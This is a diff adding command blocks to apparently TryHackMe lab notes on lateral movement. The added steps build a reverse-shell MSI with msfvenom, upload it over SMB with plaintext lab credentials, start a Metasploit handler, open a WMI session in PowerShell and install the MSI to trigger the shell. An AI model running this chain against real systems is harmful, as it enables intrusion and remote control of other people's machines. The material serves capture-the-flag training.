@@ -479,9 +479,37 @@ This is used to execute a reverse shell MSI payload.
   - User: ZA.TRYHACKME.COM\t1_corine.waters
   - Pass: Korine.1994
 - Create MSI payload with msfvenom on AttackBox.
+  ```
+  user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi
+  ```
 - Upload MSI to THMIIS via SMB → goes to C:\Windows\.
+  ```
+  user@AttackBox$ smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
+  ```
 - Start Metasploit handler.
+  ```
+  msf6 exploit(multi/handler) > set LHOST lateralmovement
+  msf6 exploit(multi/handler) > set LPORT 4445
+  msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
+  msf6 exploit(multi/handler) > exploit
+
+  [*] Started reverse TCP handler on 10.10.10.16:4445
+  ```
 - Create WMI session from THMJMP2.
+  1. First ssh za\\<AD Username>@thmjmp2.za.tryhackme.com using creds from ../cred page in task 1.  
+  2. run powershell
+  3. run the following
+     ```
+     PS C:\> $username = 't1_corine.waters';
+     PS C:\> $password = 'Korine.1994';
+     PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+     PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+     PS C:\> $Opt = New-CimSessionOption -Protocol DCOM
+     PS C:\> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
+     ```
 - Invoke MSI installation via WMI → triggers reverse shell.
+  ```
+  PS C:\> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
+  ```
 - On THMIIS reverse shell, run flag.exe on t1_corine.waters desktop.
 - Submit the flag.
